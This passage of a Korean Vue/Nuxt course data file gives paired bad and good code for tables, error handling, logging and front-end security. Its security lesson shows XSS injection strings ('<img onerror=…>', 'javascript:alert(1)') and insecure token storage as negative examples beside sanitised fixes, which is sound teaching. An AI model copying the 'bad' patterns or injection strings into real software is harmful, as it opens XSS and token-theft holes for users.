          title: `정렬 컬럼과 방향은 허용 목록에서만 받는다`,
          why: `?sort=password 나 ?sort=users.email 을 그대로 orderBy 에 넣으면 정보가 새거나 오류가 납니다. 정렬 가능한 컬럼 목록을 두고 그 안에서만, 방향은 asc/desc 둘 중 하나로 정규화합니다. 기본 정렬도 명시해야 페이지가 안정적입니다.`,
          bad: String.raw`
db.order.findMany({ orderBy: { [q.sort]: q.dir } })     // 아무 컬럼, 아무 값
`,
          good: String.raw`
const SORTABLE = { createdAt: 'createdAt', amount: 'amount', status: 'status', customer: 'customer.name' } as const
const sortKey = (q.sort in SORTABLE ? q.sort : 'createdAt') as keyof typeof SORTABLE
const dir = q.dir === 'asc' ? 'asc' : 'desc'
const orderBy = [toOrderBy(SORTABLE[sortKey], dir), { id: 'desc' }]      // 동률 시 id 로 안정 정렬: 페이지 넘길 때 행이 안 섞인다

// 프론트의 컬럼 정의에서도 같은 목록 (실무 코드 14회차: 필드 정의의 sortable)
// 복합 정렬 UI 는 드물다. 한 컬럼 + 방향으로 시작
`,
        },
        {
          id: 'l4', short: `URL 상태`,
          title: `페이지·정렬·필터·검색은 ref 가 아니라 URL 쿼리에 산다`,
          why: `3페이지에서 상세로 갔다 돌아오면 1페이지면 사용자는 포기합니다. URL 에 있으면 뒤로가기·새로고침·공유가 전부 됩니다. ref 는 URL 을 읽어 만든 파생값이고, 바꾸면 router.replace 로 URL 을 바꿉니다.`,
          bad: String.raw`
const page = ref(1); const sort = ref('createdAt'); const q = ref('')
// 상세 갔다 오면 전부 초기화
`,
          good: String.raw`
// composables/useListParams.ts
export function useListParams(defaults: { sort: string; dir: 'asc' | 'desc'; perPage?: number }) {
  const route = useRoute(); const router = useRouter()
  const params = computed(() => ({
    page: Math.max(1, Number(route.query.page) || 1),
    perPage: Number(route.query.perPage) || defaults.perPage || 20,
    sort: String(route.query.sort || defaults.sort), dir: route.query.dir === 'asc' ? 'asc' : route.query.dir === 'desc' ? 'desc' : defaults.dir,
    q: String(route.query.q ?? ''), status: toArray(route.query.status)
  }))
  function set(patch: Partial<typeof params.value>) {
    const next: Record<string, any> = { ...route.query, ...patch }
    if (!('page' in patch)) delete next.page                         // 조건이 바뀌면 1페이지로
    for (const k in next) if (next[k] === '' || next[k] == null || (Array.isArray(next[k]) && !next[k].length)) delete next[k]
    router.replace({ query: next })                                   // push 면 글자마다 히스토리
  }
  return { params, set }
}
`,
        },
        {
          id: 'l5', short: `이전 데이터 유지`,
          title: `페이지를 넘길 때 표를 비우지 않는다. 이전 데이터 위에 흐리게 로딩한다`,
          why: `페이지마다 표가 사라졌다 나타나면 높이가 튀고(CLS) 시선이 흔들립니다. 새 데이터가 올 때까지 이전 데이터를 그대로 두고 살짝 흐리게 하면 안정적입니다. useFetch 는 기본으로 이전 값을 유지하므로 status 만 보면 됩니다.`,
          bad: String.raw`
<Spinner v-if="status === 'pending'" />
<table v-else>...</table>          <!-- 페이지 넘길 때마다 표 → 스피너 → 표 -->
`,
          good: String.raw`
const { data, status } = await useFetch('/api/orders', { query, watch: [query], default: () => ({ items: [], total: 0 }) })
// 조건이 바뀌어 다시 받는 동안 data 는 이전 값 유지 (Nuxt 기본). 첫 로드만 스켈레톤

<TableSkeleton v-if="status === 'pending' && !data.items.length" :rows="20" />
<table v-else :class="{ refreshing: status === 'pending' }" aria-busy="status === 'pending'">...</table>
<style>.refreshing { opacity: .6; pointer-events: none; transition: opacity .15s }</style>

// 행 높이를 고정(또는 min-height) 하면 데이터가 바뀌어도 표 높이가 흔들리지 않는다
// 페이지가 바뀌면 표 상단으로 스크롤: watch(() => params.page, () => tableEl.value?.scrollIntoView({ block: 'start' }))
`,
        },
        {
          id: 'l6', short: `선택 상태`,
          title: `행 선택은 인덱스나 행 객체가 아니라 id 로 기억한다`,
          why: `인덱스로 기억하면 정렬·페이지가 바뀌는 순간 엉뚱한 행이 선택됩니다. 행 객체로 기억하면 다시 받은 데이터는 새 객체라 포함 여부가 깨집니다. id 집합이면 페이지를 넘겨도 선택이 유지되고 "전체 N건 선택" 도 표현할 수 있습니다.`,
          bad: String.raw`
const selected = ref<number[]>([])          // 인덱스
<input type="checkbox" :value="i" v-model="selected">
// 또는 selected.value.includes(row) — 새로고침 후엔 항상 false
`,
          good: String.raw`
const selected = ref(new Set<string>())
const toggle = (id: string) => selected.value.has(id) ? selected.value.delete(id) : selected.value.add(id)
const pageIds = computed(() => data.value.items.map((r) => r.id))
const allOnPage = computed(() => pageIds.value.length > 0 && pageIds.value.every((id) => selected.value.has(id)))
function toggleAll() { allOnPage.value ? pageIds.value.forEach((id) => selected.value.delete(id)) : pageIds.value.forEach((id) => selected.value.add(id)) }

<input type="checkbox" :checked="allOnPage" :indeterminate="!allOnPage && pageIds.some((id) => selected.has(id))" @change="toggleAll" aria-label="이 페이지 전체 선택">
<input v-for="row in data.items" type="checkbox" :checked="selected.has(row.id)" @change="toggle(row.id)" :aria-label="row.name + ' 선택'">

// "검색 결과 1,234건 전체 선택" 은 id 를 다 모으지 않고 { all: true, query } 를 서버에 보내 서버가 같은 조건으로 처리
// 조건이 바뀌면 선택을 비운다: watch(() => params.q, () => selected.value.clear())
`,
        },
        {
          id: 'l7', short: `빈 상태와 오류`,
          title: `"데이터 없음", "검색 결과 없음", "불러오기 실패" 는 다른 화면이다`,
          why: `세 상황을 빈 표 하나로 보여 주면 사용자는 뭘 해야 할지 모릅니다. 처음이라 없으면 만들기 안내, 검색 결과가 없으면 조건 바꾸기, 실패면 다시 시도. 상태를 구분해 그립니다.`,
          bad: String.raw`
<tr v-if="!data.items.length"><td colspan="6">데이터가 없습니다</td></tr>
`,
          good: String.raw`
<template v-if="status === 'error'">
  <EmptyState icon="alert" title="목록을 불러오지 못했습니다" :description="userMessage(error)"><button @click="refresh">다시 시도</button></EmptyState>
</template>
<template v-else-if="status === 'success' && !data.items.length">
  <EmptyState v-if="hasFilters" icon="search" title="조건에 맞는 주문이 없습니다"><button @click="set({ q: '', status: [] })">필터 초기화</button></EmptyState>
  <EmptyState v-else icon="box" title="아직 주문이 없습니다" description="첫 주문이 들어오면 여기에 보입니다"><NuxtLink to="/products">상품 보기</NuxtLink></EmptyState>
</template>
<table v-else>...</table>
<!-- EmptyState 는 공용 컴포넌트 하나: 아이콘·제목·설명·슬롯. 표 안이 아니라 표 자리에 -->
`,
        },
        {
          id: 'l8', short: `컬럼 정의`,
          title: `컬럼은 템플릿에 박지 않고 배열로 선언한다`,
          why: `th 와 td 를 손으로 짝 맞추면 컬럼 하나 추가에 두 곳을 고치고, 정렬 가능 여부·너비·숨김이 흩어집니다. { key, label, sortable, width, render } 배열 하나면 헤더와 셀이 같은 소스에서 나오고, 사용자 컬럼 숨기기도 쉽습니다.`,
          bad: String.raw`
<thead><tr><th>주문번호</th><th @click="sortBy('amount')">금액</th><th>상태</th>...</tr></thead>
<tbody><tr v-for="o in rows"><td>{{ o.id }}</td><td>{{ fmt(o.amount) }}</td><td><Badge :s="o.status" /></td>...</tr></tbody>
`,
          good: String.raw`
const columns: Column<Order>[] = [
  { key: 'id', label: '주문번호', width: '120px' },
  { key: 'createdAt', label: '주문일', sortable: true, format: (v) => formatDate(v, 'MM-dd HH:mm') },
  { key: 'customer', label: '고객', value: (o) => o.customer.name },
  { key: 'amount', label: '금액', sortable: true, align: 'right', format: (v) => v.toLocaleString() + '원' },
  { key: 'status', label: '상태', sortable: true, cell: 'status' }          // 슬롯 이름
]
<DataTable :columns="columns" :rows="data.items" :sort="params.sort" :dir="params.dir" @sort="(k) => set({ sort: k, dir: ... })">
  <template #cell-status="{ row }"><OrderStatusBadge :status="row.status" /></template>
</DataTable>
// DataTable 은 columns 를 돌며 th/td 를 그린다. 숨김은 columns.filter(c => !hidden.has(c.key)). 사용자 설정은 localStorage
`,
        },
        {
          id: 'l9', short: `가상 스크롤`,
          title: `한 화면에 수백 행을 넘기면 보이는 행만 그린다`,
          why: `DOM 행 2,000개는 스크롤이 버벅이고 메모리를 먹습니다. 보통은 페이지네이션(01번) 으로 100행 이하를 유지하면 되지만, 로그·채팅·긴 선택 목록처럼 한 번에 쭉 봐야 하면 가상 스크롤입니다. 행 높이가 고정이면 쉽고, 가변이면 동적 측정 옵션을 씁니다.`,
          bad: String.raw`
<tr v-for="row in rows" :key="row.id">...</tr>     <!-- rows.length === 5000 -->
`,
          good: String.raw`
// 1) 먼저: 정말 한 번에 다 보여야 하나? 페이지·검색·필터로 100행 이하면 가상 스크롤이 필요 없다
// 2) 필요하면 @tanstack/vue-virtual 또는 vue-virtual-scroller
import { useVirtualizer } from '@tanstack/vue-virtual'
const parent = useTemplateRef('parent')
const v = useVirtualizer({ count: rows.value.length, getScrollElement: () => parent.value, estimateSize: () => 44, overscan: 10 })

<div ref="parent" class="h-[600px] overflow-auto" role="grid">
  <div :style="{ height: v.getTotalSize() + 'px', position: 'relative' }">
    <div v-for="item in v.getVirtualItems()" :key="rows[item.index].id" :style="{ position: 'absolute', top: 0, transform: 'translateY(' + item.start + 'px)', height: item.size + 'px' }" role="row">
      <RowCells :row="rows[item.index]" />
    </div>
  </div>
</div>
// 테이블 시맨틱이 깨지므로 role=grid/row/gridcell 로 보완. 가변 높이는 measureElement 를 ref 로 넘긴다
// 행 컴포넌트는 가볍게: 행마다 watch·computed 10개면 가상화해도 느리다
`,
        },
        {
          id: 'l10', short: `모바일`,
          title: `좁은 화면에서 표는 가로 스크롤이나 카드로 바뀐다`,
          why: `8컬럼 표를 폰에서 그대로 두면 글자가 깨지거나 한 컬럼만 보입니다. 선택지는 둘입니다. 중요한 컬럼 2~3개만 남기고 나머지는 카드형으로 접거나, 표 전체를 가로 스크롤 영역에 넣고 첫 컬럼을 고정합니다.`,
          bad: String.raw`
<table class="w-full">...8 columns...</table>   <!-- 360px 에서 각 컬럼 40px -->
`,
          good: String.raw`
<!-- 방법 A: 컬럼 정의에 우선순위를 두고 좁으면 카드로 -->
const columns = [{ key: 'id', priority: 1 }, { key: 'amount', priority: 1 }, { key: 'status', priority: 2 }, { key: 'customer', priority: 3 }, ...]
const isNarrow = useMediaQuery('(max-width: 640px)')
<ul v-if="isNarrow" class="cards">
  <li v-for="o in rows" :key="o.id" class="card">
    <div class="row between"><b>{{ o.id }}</b><OrderStatusBadge :status="o.status" /></div>
    <div>{{ o.customer.name }} · {{ o.amount.toLocaleString() }}원</div>
    <details><summary>더 보기</summary>...나머지 컬럼...</details>
  </li>
</ul>
<DataTable v-else ... />

<!-- 방법 B: 가로 스크롤 + 첫 컬럼 고정 -->
<div class="overflow-x-auto"><table class="min-w-[800px]"><th class="sticky left-0 bg-white">...</th></table></div>
<!-- 어느 쪽이든 행 클릭 → 상세 화면이 모바일의 주 동선. 셀 안 버튼 7개는 ⋯ 메뉴로 모은다 -->
`,
        },
      ],
    },
    {
      id: 'vue-27', no: 27, name: `에러 처리, 로깅, 모니터링`,
      lead: `오류를 삼키지 않고, 사용자에게는 할 수 있는 일을, 개발자에게는 원인을 보여 주는 습관입니다. Nuxt 의 에러 흐름, 로그의 모양, 민감정보, 소스맵, 알림 임계까지.`,
      lessons: [
        {
          id: 'l1', short: `삼키지 않기`,
          title: `빈 catch 는 없다. 처리하거나, 보고하거나, 다시 던진다`,
          why: `catch {} 는 오류를 없애는 게 아니라 숨깁니다. 사용자는 아무 일도 안 일어난 화면을 보고, 개발자는 로그가 없어 영원히 모릅니다. 처리할 수 없는 오류는 보고(report) 하고 상위로 던집니다.`,
          bad: String.raw`
try { await save() } catch (e) {}
try { await save() } catch (e) { console.log(e) }       // 운영에서는 아무도 안 본다
promise.then(...)                                        // catch 없음: unhandledrejection
`,
          good: String.raw`
try {
  await save()
} catch (e) {
  const err = toApiError(e)                               // 한 모양으로 (실무 코드 2회차 02번)
  if (err.isValidation) { setErrors(err.fields); return } // 처리할 수 있는 것: 처리
  report(err, { where: 'OrderForm.save', orderId })       // 처리 못 하는 것: 보고
  toast.error(userMessage(err))                           // 사용자에게는 번역된 문구
}
// 정말 무시해도 되는 오류는 왜 무시하는지 적는다
try { localStorage.setItem(k, v) } catch { /* 사생활 모드·용량 초과: 저장 안 돼도 동작에 지장 없음 */ }
`,
        },
        {
          id: 'l2', short: `createError`,
          title: `서버 오류는 createError 로 상태 코드와 사용자 문구를 함께 던진다`,
          why: `throw new Error('없음') 은 500 으로 나가고 문구는 노출되거나 사라집니다. createError({ statusCode, statusMessage, data }) 는 Nitro 가 올바른 상태 코드로 응답하고, 클라이언트의 useFetch error 와 error.vue 가 그대로 읽습니다. 4xx 문구는 사용자용, 5xx 는 내부 정보를 담지 않습니다.`,
          bad: String.raw`
if (!order) throw new Error('order not found')          // 500 + 스택 노출(dev)
if (!allowed) return { error: 'forbidden' }              // 200 으로 오류: 클라이언트가 못 알아챈다
`,
          good: String.raw`
if (!order) throw createError({ statusCode: 404, statusMessage: '주문을 찾을 수 없습니다' })
if (!allowed) throw createError({ statusCode: 403, statusMessage: '권한이 없습니다' })
if (!parsed.success) throw createError({ statusCode: 400, statusMessage: '입력을 확인하세요', data: { code: 'VALIDATION', fields: fieldErrors(parsed.error) } })

// 예상 못 한 오류: 그대로 두면 Nitro 가 500 으로 바꾼다. 문구는 운영에서 숨겨진다
// 내부 사유는 로그에만: console.error('[orders] confirm failed', { orderId, err }) 후 throw createError({ statusCode: 500, statusMessage: '결제 확인 중 오류가 발생했습니다' })

// 클라이언트에서 읽기: error.value.statusCode, error.value.statusMessage, error.value.data.fields
`,
        },
        {
          id: 'l3', short: `fatal 과 지역 오류`,
          title: `페이지 전체가 의미 없는 오류만 fatal, 나머지는 그 자리에서 처리한다`,
          why: `상품 상세에서 상품이 없으면 페이지 자체가 의미 없으니 404 전체 화면이 맞습니다. 그런데 추천 상품 위젯이 실패했다고 전체를 오류 페이지로 보내면 안 됩니다. useFetch 의 error 를 그 위젯 안에서 처리하고, fatal 은 핵심 데이터에만.`,
          bad: String.raw`
const { data: recs, error } = await useFetch('/api/recommend')
if (error.value) throw createError({ ...error.value, fatal: true })   // 추천 실패로 상품 페이지 전체가 죽는다
`,
          good: String.raw`
// 핵심 데이터: 없으면 페이지가 의미 없다 → fatal
const { data: product, error } = await useFetch('/api/products/' + id)
if (error.value) throw createError({ statusCode: error.value.statusCode ?? 500, statusMessage: error.value.statusMessage, fatal: true })

// 부가 위젯: 자기 자리에서
const { data: recs, error: recError, refresh } = await useLazyFetch('/api/recommend', { query: { id } })
<section>
  <h2>이런 상품은 어때요</h2>
  <InlineError v-if="recError" message="추천을 불러오지 못했습니다" @retry="refresh" />
  <ProductRow v-else :items="recs" />
</section>
// <NuxtErrorBoundary> 로 렌더 오류도 그 영역만: <NuxtErrorBoundary @error="report"><Widget /><template #error="{ error, clearError }">…</template></NuxtErrorBoundary>
`,
        },
        {
          id: 'l4', short: `error.vue`,
          title: `전체 오류 페이지는 상태 코드별로 다르게, 복구 버튼과 함께`,
          why: `404 와 500 은 사용자가 할 일이 다릅니다. 404 는 홈이나 검색으로, 500 은 다시 시도. 운영에서는 스택을 보여 주지 않고, 오류 id(requestId) 를 보여 주면 문의 때 바로 찾을 수 있습니다. clearError 로 앱 상태를 유지한 채 복귀합니다.`,
          bad: String.raw`
<!-- error.vue -->
<template><div>오류가 발생했습니다: {{ error.message }}</div></template>   <!-- 500 스택이 그대로, 돌아갈 길 없음 -->
`,
          good: String.raw`
<!-- error.vue -->
<script setup lang="ts">
import type { NuxtError } from '#app'
const props = defineProps<{ error: NuxtError }>()
const is404 = computed(() => props.error.statusCode === 404)
const requestId = computed(() => (props.error.data as any)?.requestId)
onMounted(() => { if (!is404.value) report(props.error, { fatal: true }) })     // 404 는 보고하지 않는다 (소음)
useHead({ title: is404.value ? '페이지를 찾을 수 없습니다' : '오류' })
</script>
<template>
  <NuxtLayout name="minimal">
    <main class="center">
      <h1>{{ is404 ? '페이지를 찾을 수 없습니다' : '문제가 발생했습니다' }}</h1>
      <p v-if="is404">주소가 바뀌었거나 삭제된 페이지입니다.</p>
      <p v-else>잠시 후 다시 시도해 주세요. 계속되면 아래 번호로 문의해 주세요.</p>
      <p v-if="requestId" class="tiny muted">오류 번호: {{ requestId }}</p>
      <pre v-if="$config.public.dev">{{ error.stack }}</pre>
      <div class="row gap">
        <button v-if="!is404" @click="clearError()">다시 시도</button>
        <button @click="clearError({ redirect: '/' })">홈으로</button>
      </div>
    </main>
  </NuxtLayout>
</template>
`,
        },
        {
          id: 'l5', short: `전역 수집`,
          title: `Vue 오류, Promise 거부, 일반 오류를 한 report() 로 모은다`,
          why: `컴포넌트 렌더 오류는 errorHandler 로, await 없는 Promise 는 unhandledrejection 으로, 이벤트 핸들러 밖 오류는 window.error 로 새어 나갑니다. 네 경로를 한 함수로 모으면 어디서 났든 같은 형식으로 보고됩니다. 취소·네트워크는 걸러 소음을 줄입니다.`,
          bad: String.raw`
// 아무 설정 없음. 운영에서 난 오류는 사용자 브라우저 콘솔에만 있다
`,
          good: String.raw`
// plugins/error.client.ts
export default defineNuxtPlugin((nuxtApp) => {
  nuxtApp.vueApp.config.errorHandler = (err, instance, info) => report(err, { source: 'vue', info, component: instance?.$options.__name })
  nuxtApp.hook('vue:error', (err, _, info) => report(err, { source: 'nuxt', info }))
  window.addEventListener('unhandledrejection', (e) => { report(e.reason, { source: 'promise' }); e.preventDefault() })
  window.addEventListener('error', (e) => report(e.error ?? e.message, { source: 'window', file: e.filename, line: e.lineno }))
})

export function report(err: unknown, ctx: Record<string, unknown> = {}) {
  const e = toApiError(err)
  if (e.code === 'CANCELED' || e.isNetwork || e.status === 401) return     // 취소, 오프라인, 인증 만료는 오류가 아니다
  if (seenRecently(e)) return                                               // 같은 오류 1분에 한 번만 (루프 폭주 방지)
  console.error('[report]', e, ctx)
  Sentry.captureException(e.raw ?? e, { extra: ctx, tags: { source: ctx.source } })
}
// 서버 쪽은 nitro 플러그인: nitroApp.hooks.hook('error', (err, { event }) => log.error({ err, path: event?.path, requestId: event?.context.requestId }))
`,
        },
        {
          id: 'l6', short: `구조화 로그`,
          title: `서버 로그는 문장이 아니라 JSON 한 줄이고, 레벨과 requestId 가 있다`,
          why: `console.log('주문 저장 ' + id) 는 검색도 집계도 안 됩니다. { level, msg, requestId, userId, orderId, ms } 한 줄이면 로그 시스템에서 "이 요청의 전부", "이 사용자의 오류", "500ms 넘는 요청" 을 바로 뽑습니다.`,
          bad: String.raw`
console.log('order saved ' + order.id)
console.log('error!!', e)
console.log(JSON.stringify(req.body))     // 비밀번호가 로그에
`,
          good: String.raw`
// server/utils/log.ts (pino)
import pino from 'pino'
export const log = pino({ level: process.env.LOG_LEVEL ?? 'info', redact: ['password', 'token', '*.password', 'headers.authorization', 'headers.cookie'] })

// server/middleware/request.ts — 요청마다 id 와 자식 로거
export default defineEventHandler((event) => {
  const requestId = getHeader(event, 'x-request-id') ?? randomUUID()
  event.context.requestId = requestId
  event.context.log = log.child({ requestId, path: event.path, method: event.method })
  setHeader(event, 'x-request-id', requestId)                            // 클라이언트도 받아 오류 화면에 보여 준다 (04번)
  const start = performance.now()
  event.node.res.on('finish', () => event.context.log.info({ status: event.node.res.statusCode, ms: Math.round(performance.now() - start) }, 'request'))
})

// 핸들러에서
event.context.log.info({ orderId: order.id, amount: order.amount }, 'order confirmed')
event.context.log.error({ err, orderId }, 'pg confirm failed')            // err 는 pino 가 stack 포함 직렬화
// 레벨: debug(개발), info(정상 흐름의 이정표), warn(이상하지만 처리됨), error(실패)
`,
        },
        {
          id: 'l7', short: `민감정보`,
          title: `로그와 오류 보고에 토큰·비밀번호·개인정보를 넣지 않는다`,
          why: `오류 보고 도구에 요청 본문을 통째로 붙이면 비밀번호와 카드번호가 제3자 서버에 저장됩니다. 로그는 오래 남고 많은 사람이 봅니다. 식별에 필요한 id 만 남기고, 본문은 마스킹하거나 키 목록만 남깁니다.`,
          bad: String.raw`
Sentry.captureException(e, { extra: { body: req.body, headers: req.headers, user } })
log.info({ user }, 'login')               // email, phone, address 전부
`,
          good: String.raw`
// 보고에는 id 와 모양만
Sentry.captureException(e, { extra: { bodyKeys: Object.keys(body), orderId }, user: { id: user.id } })   // 이메일·이름 없이 id 만
log.info({ userId: user.id }, 'login')

// 마스킹 유틸
const mask = (s: string) => s.length <= 4 ? '****' : s.slice(0, 2) + '*'.repeat(s.length - 4) + s.slice(-2)
log.info({ phone: mask(phone) }, 'sms sent')

// Sentry 설정: beforeSend 로 한 번 더 거른다
Sentry.init({ beforeSend(event) { delete event.request?.cookies; delete event.request?.headers?.Authorization; return event }, sendDefaultPii: false })
// 클라이언트 breadcrumb 의 입력값: Sentry 의 maskAllText / 입력 필드 data-sentry-mask. 세션 리플레이는 기본 마스킹을 끄지 않는다
`,
        },
        {
          id: 'l8', short: `소스맵과 릴리즈`,
          title: `보고된 스택이 app.3f2a.js:1:48213 이면 의미가 없다. 소스맵과 릴리즈를 올린다`,
          why: `운영 번들은 압축돼 있어 스택만으로는 어느 줄인지 모릅니다. 빌드 때 소스맵을 Sentry 에 올리고 릴리즈(커밋 해시) 를 붙이면 원본 줄과 "어느 배포부터" 가 보입니다. 소스맵은 공개 서버에 두지 않습니다.`,
          bad: String.raw`
// 소스맵 없음. 오류: "TypeError: Cannot read properties of undefined (reading 'id') at a.3f2a.js:1:48213"
// 소스맵을 .output/public 에 그대로 두어 누구나 원본 코드를 본다
`,
          good: String.raw`
// nuxt.config.ts — @sentry/nuxt
export default defineNuxtConfig({
  modules: ['@sentry/nuxt/module'],
  sentry: { sourceMapsUploadOptions: { org: 'my-org', project: 'web', authToken: process.env.SENTRY_AUTH_TOKEN } },   // 빌드 시 업로드 후 삭제
  sourcemap: { client: 'hidden' }                                       // 생성은 하되 번들에 //# sourceMappingURL 를 넣지 않는다
})
// sentry.client.config.ts
Sentry.init({ dsn, release: process.env.NUXT_PUBLIC_RELEASE, environment: process.env.NUXT_PUBLIC_ENV, tracesSampleRate: 0.1, replaysOnErrorSampleRate: 0.5 })
// CI: NUXT_PUBLIC_RELEASE=$GITHUB_SHA → "이 오류는 커밋 a1b2c3 배포 뒤 시작" 이 보인다
// 배포 후 10분 오류율 비교 → 급증하면 롤백. 이게 릴리즈 태그의 진짜 용도
`,
        },
        {
          id: 'l9', short: `사용자 행동 기록`,
          title: `오류 앞 30초의 행동(클릭, 라우트, 요청) 을 함께 보낸다`,
          why: `"undefined 의 id 를 읽음" 만으로는 재현이 안 됩니다. 어느 페이지에서 무엇을 누르고 어떤 요청이 실패한 뒤 났는지가 있어야 합니다. Sentry breadcrumb 이 자동으로 상당 부분을 남기고, 라우트 전환과 주요 액션은 직접 추가합니다.`,
          bad: String.raw`
// 보고: 스택만. 재현 불가 → "다시 발생하면 알려 주세요"
`,
          good: String.raw`
// plugins/breadcrumbs.client.ts
export default defineNuxtPlugin(() => {
  const router = useRouter()
  router.afterEach((to, from) => Sentry.addBreadcrumb({ category: 'navigation', message: from.path + ' → ' + to.path, level: 'info' }))
})
// API 계층 (실무 코드 2회차) 의 인터셉터에서: 실패 응답마다 breadcrumb { category: 'api', data: { url, status, requestId } }
// 주요 액션: Sentry.addBreadcrumb({ category: 'ui', message: 'checkout.pay', data: { orderId } })
// 사용자 식별: 로그인 시 Sentry.setUser({ id: user.id }); 로그아웃 시 setUser(null)
// 서버 requestId 를 태그로: Sentry.setTag('requestId', res.headers['x-request-id']) → 서버 로그(06번) 와 붙는다
// 세션 리플레이(화면 녹화) 는 오류 발생 세션만 (replaysOnErrorSampleRate), 입력값은 마스킹 (07번)
`,
        },
        {
          id: 'l10', short: `알림 임계`,
          title: `오류 하나하나가 아니라 비율과 신규 오류에 알림을 건다`,
          why: `오류마다 슬랙이 울리면 하루 만에 아무도 안 봅니다. "새로운 종류의 오류", "5분 오류율 1% 초과", "특정 오류 1시간 100건 초과" 처럼 임계를 두고, 배포 직후는 더 민감하게 봅니다. 알림은 대응 담당과 런북 링크가 있어야 의미가 있습니다.`,
          bad: String.raw`
// Sentry → Slack: 모든 이벤트. 하루 400개 메시지. 채널 뮤트
`,
          good: String.raw`
/* 알림 규칙 (Sentry Alerts 또는 로그 시스템)
   1. 새 이슈 (처음 보는 오류)                → 즉시, #web-alerts
   2. 오류율: 5분간 요청 대비 오류 > 1%        → 즉시, 온콜 호출
   3. 특정 이슈 1시간 > 100건                  → 1시간에 한 번
   4. 결제 confirm 실패 (태그 flow=payment)    → 3건이면 즉시 (돈이 걸린 흐름은 따로)
   5. 배포 후 30분 오류율이 이전 1시간의 2배    → 릴리즈 비교 알림 (08번 릴리즈 태그)
   6. Web Vitals p75 가 목표 초과 3일 연속      → 주간 리포트로 (23회차)

   제외: 404, 네트워크 오류, 취소, 봇 UA, 브라우저 확장 프로그램 스택(chrome-extension://)
   모든 알림에: 담당 로테이션, 대시보드 링크, 런북 (무엇을 먼저 볼지) */

// 클라이언트 보고 샘플링: 트래픽이 크면 같은 오류를 전부 보낼 필요가 없다
Sentry.init({ sampleRate: 0.3, ignoreErrors: ['ResizeObserver loop', 'Non-Error promise rejection', /chrome-extension/] })
`,
        },
      ],
    },
    {
      id: 'vue-28', no: 28, name: `보안 (CSP, XSS, 의존성 점검)`,
      lead: `프론트엔드에서 막을 수 있는 것과 서버가 막아야 하는 것을 구분하는 습관입니다. v-html, CSP, 토큰 저장, CSRF, 서버 검증, 리다이렉트, 환경변수, 의존성, 속도 제한, 헤더.`,
      lessons: [
        {
          id: 'l1', short: `v-html`,
          title: `v-html 에는 서버가 걸러 준 HTML 만 넣는다`,
          why: `사용자 입력을 v-html 로 넣으면 그 사용자가 다른 사용자의 브라우저에서 스크립트를 실행합니다(XSS). Vue 의 {{ }} 는 자동으로 이스케이프되니 기본은 텍스트 바인딩. HTML 이 꼭 필요하면 서버에서 허용 목록으로 sanitize 한 결과만 넣습니다.`,
          bad: String.raw`
<div v-html="comment.body"></div>                    <!-- 사용자가 쓴 그대로 -->
<div v-html="'<b>' + user.name + '</b>'"></div>       <!-- 이름에 <img onerror=…> -->
<a :href="user.website">홈페이지</a>                   <!-- javascript:alert(1) -->
`,
          good: String.raw`
<p>{{ comment.body }}</p>                               <!-- 기본: 텍스트 -->
<b>{{ user.name }}</b>
<div v-html="post.bodySanitized"></div>                 <!-- 서버가 sanitize-html 로 거른 것 (실무 코드 19회차 07번) -->
<a :href="safeUrl(user.website)" rel="noopener noreferrer nofollow" target="_blank">홈페이지</a>

// utils/safeUrl.ts
export function safeUrl(u?: string) { try { const p = new URL(u ?? '', location.origin); return ['http:', 'https:', 'mailto:'].includes(p.protocol) ? p.href : '#' } catch { return '#' } }
// 클라이언트에서 꼭 걸러야 하면 DOMPurify. 하지만 "서버가 저장할 때 거른다" 가 원칙: 저장된 것은 어디서 보여 줘도 안전하다
`,
        },
        {
          id: 'l2', short: `CSP`,
          title: `Content-Security-Policy 로 인라인 스크립트와 외부 출처를 제한한다`,
          why: `XSS 가 뚫려도 CSP 가 있으면 외부 스크립트 로드와 인라인 실행이 막혀 피해가 줄어듭니다. 인라인은 nonce 로만 허용하고 출처는 허용 목록으로. nuxt-security 모듈이 헤더와 nonce 주입을 맡습니다. Report-Only 로 시작해 위반을 보고 조정합니다.`,
          bad: String.raw`
// CSP 없음. 또는 script-src 'unsafe-inline' 'unsafe-eval' * — 있으나 마나
`,
          good: String.raw`
// nuxt.config.ts — nuxt-security
export default defineNuxtConfig({
  modules: ['nuxt-security'],
  security: {
    nonce: true,                                                            // 모든 <script> 에 nonce 주입
    headers: {
      contentSecurityPolicy: {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'nonce-{{nonce}}'", "'strict-dynamic'", 'https://js.tosspayments.com', 'https://dapi.kakao.com'],
        'style-src': ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],   // 스타일 인라인은 보통 허용 (Vue 가 style 속성을 쓴다)
        'img-src': ["'self'", 'data:', 'blob:', 'https://cdn.example.com'],
        'connect-src': ["'self'", 'https://api.example.com', 'wss://rt.example.com', 'https://*.sentry.io'],
        'font-src': ["'self'", 'https://fonts.gstatic.com'],
        'frame-src': ['https://js.tosspayments.com'],
        'object-src': ["'none'"], 'base-uri': ["'self'"], 'form-action': ["'self'"], 'frame-ancestors': ["'none'"],
        'report-uri': ['/api/csp-report']
      },
      crossOriginEmbedderPolicy: false                                      // 외부 iframe(결제) 을 쓰면 끈다
    }
  }
})
// 도입 순서: Content-Security-Policy-Report-Only 로 1~2주 → 위반 리포트 보고 허용 목록 정리 → 강제
// 새 서드파티를 넣을 때마다 connect-src/script-src 에 추가하는 것이 "누가 우리 페이지에서 뭘 하는지" 목록이 된다
`,
        },
        {
          id: 'l3', short: `토큰 저장`,
          title: `리프레시 토큰은 httpOnly 쿠키, 액세스 토큰은 메모리. localStorage 에 두지 않는다`,
          why: `localStorage 의 토큰은 XSS 한 줄로 전부 털립니다. httpOnly 쿠키는 스크립트가 못 읽고, 액세스 토큰은 짧게 살고 메모리에만 두면 새로고침 때 쿠키로 재발급합니다(실무 코드 1회차). 쿠키는 SameSite 와 Secure 를 꼭 붙입니다.`,
          bad: String.raw`
localStorage.setItem('accessToken', token)
localStorage.setItem('refreshToken', refresh)        // XSS → 영구 탈취
document.cookie = 'token=' + token                   // httpOnly 아님, SameSite 없음
`,
          good: String.raw`
// server/api/auth/login.post.ts
setCookie(event, 'rt', refreshToken, { httpOnly: true, secure: true, sameSite: 'lax', path: '/api/auth', maxAge: 60 * 60 * 24 * 14 })   // 재발급 경로에만 전송
return { accessToken, expiresIn: 900 }                // 15분. 클라이언트는 메모리(Pinia) 에만

// 클라이언트: 새로고침 → 메모리 비어 있음 → POST /api/auth/refresh (쿠키 자동) → 새 액세스 토큰
// nuxt-auth-utils 를 쓰면 세션 전체가 암호화된 httpOnly 쿠키 (파인코드 13회차)
